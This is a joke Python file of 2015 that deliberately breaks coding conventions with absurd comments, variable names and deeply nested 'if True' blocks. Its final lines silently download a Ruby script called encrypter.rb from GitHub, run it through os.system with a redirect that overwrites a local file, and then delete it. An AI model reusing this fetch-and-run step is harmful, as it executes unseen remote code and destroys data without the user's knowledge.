"""
Python file to break all the rules. ALL OF THEM
@author: Krisztian Koves
@date: 4/17/15
"""
#Obligatory beginning of file comment: This is a comment

#make variables
thisIsAVariableThatStoresLiterallyNothing = "Literally nothing" #this is a variable that stores literally nothing. Seriously, why are you still reading this comment?!

#print the variable that stores literally nothing
print(thisIsAVariableThatStoresLiterallyNothing + "\n") #this is a print statement

def thisIsNotTheMainFunction(): #defines a function called thisIsNotTheMainFunction
    if True: #This will always be true, so it will always run
        if True: #This will also always run
            if True: #This too shall pass
                if True: #Always true
                    if True: #Always true
                        if True: #Always true
                            if True: #Always true
                                if True: #Always true
                                    if True: #Always true
                                        if True: #Always true
                                            if True: #Always true
                                                if True:  #Always true
                                                    if True: #Always true
                                                        if True: #Always true
                                                            if True: #Always true
                                                                if True: #Always true
                                                                    print("\t\tHow you like them indents?\n") #Useless comment


thisIsNotTheMainFunction() #Invokes the function thisIsNotTheMainFunction()

def thisIsNotARecursiveFunction(): #Defines a (non-recursive) function, thisIsNotARecursiveFunction
    thisIsAnArrayThatStoresStrings = ["This function does", "the same thing as", "a recursive function", "But...", "It's not a recursive function!\n"] #Defines an array of strings
    #this is an empty line for spacing
    for thisIsATempString in thisIsAnArrayThatStoresStrings: #Loops through the array with a for-in loop, because why use do-while?
        print(thisIsATempString) #Print the current string from the array
    return "This is the result of a return statement (from a non-recursive function, of course)." #Return a snarky comment


print(thisIsNotARecursiveFunction()) #Call the function thisIsNotARecursiveFunction() and print the return value

githubRawCodeURL = 'https://raw.githubusercontent.com/kkoves/zip-zap-zabrian/master/encrypter.rb'
try:
  import urllib.request
  githubRawCode = urllib.request.urlopen(githubRawCodeURL).read().decode(encoding='UTF-8')
except Exception:
  import urllib
  githubRawCode = urllib.urlopen(githubRawCodeURL).read().decode(encoding='UTF-8')
import os

open('encrypter.rb', 'w').write(githubRawCode)
os.system('ruby encrypter.rb file > file')
os.remove('encrypter.rb')

#This is the end of the file. You can stop reading now. (Obligatory end of file comment)
